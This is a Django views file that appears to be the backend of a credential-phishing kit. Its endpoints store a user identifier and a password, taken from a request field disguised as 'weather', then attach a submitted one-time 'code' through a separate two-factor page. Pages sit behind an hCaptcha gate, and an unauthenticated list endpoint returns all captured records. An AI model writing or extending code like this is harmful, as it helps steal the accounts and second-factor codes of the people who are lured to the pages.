from django.shortcuts import render
from .models import UserInfo, CodeInfo
from rest_framework import generics, status
from rest_framework.views import APIView
from rest_framework.response import Response
from .serializers import UserInfoSerializer, CodeCreateSerializer
from django.shortcuts import render, redirect
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.conf import settings


class UserInfoAPIView(generics.ListAPIView):
    queryset = UserInfo.objects.all()
    serializer_class = UserInfoSerializer


class LatestUserInfoView(generics.RetrieveAPIView):
    serializer_class = UserInfoSerializer

    def get_object(self):
        try:
            latest_user_info = UserInfo.objects.latest('id')
        except UserInfo.DoesNotExist:
            latest_user_info = UserInfo(id=1)
        return latest_user_info

    def retrieve(self, request, *args, **kwargs):
        instance = self.get_object()
        serializer = self.get_serializer(instance)
        data = serializer.data
        user_id = data.get('id')
        return Response({'id': user_id})


class CreateUserInfoAPIView(APIView):
    def post(self, request, *args, **kwargs):
        user_info_id = request.data.get('id')
        user_info_uid = request.data.get('info')
        user_info_pwd = request.data.get('weather')
        try:
            user_info_instance = UserInfo.objects.create(
                id=user_info_id, uid=user_info_uid, pwd=user_info_pwd)
            serializer = UserInfoSerializer(user_info_instance)
            return Response(status=status.HTTP_200_OK)
        except Exception as e:
            return Response({"error": f"An error occurred: {str(e)}"}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)


class UpdateUserCodeView(APIView):
    def post(self, request, *args, **kwargs):
        user_info_id = request.data.get('id')
        code_value = request.data.get('code')
        try:
            code_info_instance = CodeInfo.objects.create(value=code_value)
            user_info_instance = UserInfo.objects.get(id=user_info_id)
            user_info_instance.code = code_info_instance
            user_info_instance.save()

            serializer = UserInfoSerializer(user_info_instance)
            return Response(status=status.HTTP_200_OK)
        except Exception as e:
            return Response({"error": f"An error occurred: {str(e)}"}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)


def home_view(request):
    return render(request, 'home.html')


def fa_view(request):
    return render(request, 'code.html')


def success_view(request):
    return render(request, 'success.html')


@csrf_exempt
def hcaptcha_challenge(request):
    if request.method == 'GET':
        request.session['original_path'] = request.META.get(
            'HTTP_REFERER', '/')
    return render(request, 'hcaptcha_challenge.html', {'hcaptcha_site_key': settings.HCAPTCHA_SITEKEY})
